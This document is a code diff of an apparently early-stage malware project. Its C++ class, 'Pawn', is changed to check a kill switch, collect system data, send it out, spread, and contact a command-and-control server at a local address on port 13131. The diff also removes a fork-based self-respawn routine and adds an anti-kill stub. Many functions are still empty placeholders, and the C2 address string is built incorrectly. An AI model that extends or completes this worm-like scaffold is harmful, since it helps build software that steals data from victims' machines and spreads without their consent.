@@ -10,12 +10,12 @@
 
 
 
-int Pawn::sendMyselfData() {
+bool Pawn::sendMySelfData() {
 
-    return 1;
+    return true;
 }
 
-int Pawn::needReborn() {
+bool Pawn::checkSWKill() {
     /* TEMPORARY
      * looking for parent
      * if it is, don't create clones */
@@ -23,9 +23,7 @@ int Pawn::needReborn() {
     std::string url = "localhost:65501";
     auto resp = myget(url);
 
-    if (resp.status_code == 200) {
-        return 0;
-    } else return 1;
+    return resp.status_code == 200;
 }
 
 //int Pawn::readPidFile(std::string fname) {
@@ -43,27 +41,8 @@ int Pawn::needReborn() {
 //
 //}
 
-int go() {
-    std::string url = "localhost:65501";
-    auto resp = myget(url);
-
-    if (resp.status_code == 200) {
-        return 0;
-    } else return 1;
-}
-
-void Pawn::reborn() {
-    if (needReborn() == 1) {
-        // fork here
-        int child1 = fork();
-        std::cout << "Child 1 pid = " << getpid() << std::endl;
-
-        int ppid = readPidFile("/tmp/pawn.pid");
-        if (ppid != -1){
-            // parent exists
-            std::cout << ppid << std::endl;
-        }
-    }
+bool Pawn::spread() {
+    return true;
 }
 
 void Pawn::doWork() {
@@ -74,12 +53,35 @@ void Pawn::doWork() {
 }
 
 Pawn::Pawn() {
-    currentPID = getpid();
-
-    systemData = SystemDataCollector();
-    int sendSystemDataResult = sendMyselfData();
+    if (!checkSWKill()) {
+        systemData = SystemDataCollector();
+        bool sendSystemDataResult = sendMySelfData();
+        bool spreadResult = spread();
+        doWork();
+    }
 
 
 }
 
 Pawn::~Pawn() { }
+
+
+bool Pawn::connect2CC() {
+    std::string CCIP = "127.0.0.1";
+    std::string CCPort = "13131";
+
+    std::map<std::string, std::string> dataQuickCheck;
+    dataQuickCheck.insert(std::pair<std::string, std::string>("world", "1111"));
+
+    int connectCheckResult = mypost(CCIP+CCPort+"/hello", dataQuickCheck);
+
+    return (bool)connectCheckResult;
+}
+
+bool Pawn::sendData2IP() {
+    return true;
+}
+
+void preventKill() {
+    // monitor sent signals
+}
